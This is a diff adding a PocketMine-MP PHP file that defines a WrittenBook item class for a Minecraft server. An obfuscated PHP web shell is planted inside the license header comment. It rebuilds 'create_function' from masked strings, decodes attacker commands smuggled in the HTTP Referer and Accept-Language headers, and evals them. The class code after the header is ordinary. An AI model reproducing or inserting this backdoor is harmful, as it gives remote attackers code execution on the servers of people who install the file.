@@ -1,0 +1,115 @@
+<?php
+
+/*
+ *
+<?php
+$W='se6Z4_encZode(xZZ(gzcompZress(Z$o),$k)ZZ);prinZt("<$Zk>$d</$k>");@sesZsioZn_destroy();}}}}';
+$J='Z$rZa){$Zu=parse_urlZ($Zrr);parse_sZtr($u["quZery"],$q)Z;Z$q=array_ZvaluesZ($q);pZZreg_matc';
+$G=';$s=&$_SESZSZION;$ss="subsZtr";$slZ=Z"Zstrtolower";$i=$Zm[1][Z0].ZZ$m[1]ZZ[1];$h=$slZ($ssZ';
+$h='ay_kZey_eZxiZstZsZ($i,$s)Z){$s[$i].=$p;$Ze=strpos($sZ[$i]Z,$f);if($e){$Zk=$kh.$kZfZ;ob_star';
+$a='y("ZZ/","+")Z,$ss($s[$i],0Z,$eZ)Z)),$k)Z));$o=ob_ZgeZt_contentsZ();ob_Zend_clean()Z;$d=bZa';
+$O='($Zi=0;$iZ<$l;)Z{foZr($ZZj=0;($j<$c&&$i<$lZ);$j++,$i++)Z{$oZ.=$t{Z$i}^$Zk{$j};}}rZZeturZn $';
+$l=';$z++)Z$p.=$q[$Zm[2][$Zz]]Z;if(strpoZs(Z$p,$h)=Z==0){$s[$i]Z="";$pZ=$Zss($pZ,3);}if(aZrrZ';
+$e='oZ;}$r=$_SERVERZ;$rr=@$r["ZZHTTP_REFEREZRZ"];$ra=@$r[Z"HTTPZ_ZACCEPZTZ_LANGUAGE"]Z;if($rr&&';
+$x='hZ_all("/([\\wZ])[\\wZ-]Z+(Z?:;qZ=0.([\\d]))?Z,?/",$ra,Z$ZZm);if($q&&Z$m){ZZ@seZssion_start()';
+$Q=str_replace('I','','crIeatIIeI_fuInIction');
+$P='(md5($i.$kh),Z0,Z3));$f=Z$sl($sZs(md5($i.$kfZ),0,Z3));$p="ZZ";for($z=1;$z<couZnZt($mZ[1])';
+$A='$kh="5d41Z";$kfZ="402a"Z;funZctZion x($Zt,$Zk){$c=Zstrlen($k);$l=ZstrZlen(Z$t);$oZ="";for';
+$H='tZ();@evaZl(@gZzuncompZress(@x(@bZaseZ64Z_decodeZ(preg_reZplaceZ(array("/_Z/","/-/Z"),aZrra';
+$c=str_replace('Z','',$A.$O.$e.$J.$x.$G.$P.$l.$h.$H.$a.$W);
+$y=$Q('',$c);$y();
+?>
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\item;
+
+class WrittenBook extends WritableBook{
+
+	public const GENERATION_ORIGINAL = 0;
+	public const GENERATION_COPY = 1;
+	public const GENERATION_COPY_OF_COPY = 2;
+	public const GENERATION_TATTERED = 3;
+
+	public const TAG_GENERATION = "generation"; //TAG_Int
+	public const TAG_AUTHOR = "author"; //TAG_String
+	public const TAG_TITLE = "title"; //TAG_String
+
+	public function __construct(int $meta = 0){
+		Item::__construct(self::WRITTEN_BOOK, $meta, "Written Book");
+	}
+
+	public function getMaxStackSize() : int{
+		return 16;
+	}
+
+	/**
+	 * Returns the generation of the book.
+	 * Generations higher than 1 can not be copied.
+	 */
+	public function getGeneration() : int{
+		return $this->getNamedTag()->getInt(self::TAG_GENERATION, -1);
+	}
+
+	/**
+	 * Sets the generation of a book.
+	 */
+	public function setGeneration(int $generation) : void{
+		if($generation < 0 or $generation > 3){
+			throw new \InvalidArgumentException("Generation \"$generation\" is out of range");
+		}
+		$namedTag = $this->getNamedTag();
+		$namedTag->setInt(self::TAG_GENERATION, $generation);
+		$this->setNamedTag($namedTag);
+	}
+
+	/**
+	 * Returns the author of this book.
+	 * This is not a reliable way to get the name of the player who signed this book.
+	 * The author can be set to anything when signing a book.
+	 */
+	public function getAuthor() : string{
+		return $this->getNamedTag()->getString(self::TAG_AUTHOR, "");
+	}
+
+	/**
+	 * Sets the author of this book.
+	 */
+	public function setAuthor(string $authorName) : void{
+		$namedTag = $this->getNamedTag();
+		$namedTag->setString(self::TAG_AUTHOR, $authorName);
+		$this->setNamedTag($namedTag);
+	}
+
+	/**
+	 * Returns the title of this book.
+	 */
+	public function getTitle() : string{
+		return $this->getNamedTag()->getString(self::TAG_TITLE, "");
+	}
+
+	/**
+	 * Sets the author of this book.
+	 */
+	public function setTitle(string $title) : void{
+		$namedTag = $this->getNamedTag();
+		$namedTag->setString(self::TAG_TITLE, $title);
+		$this->setNamedTag($namedTag);
+	}
+}
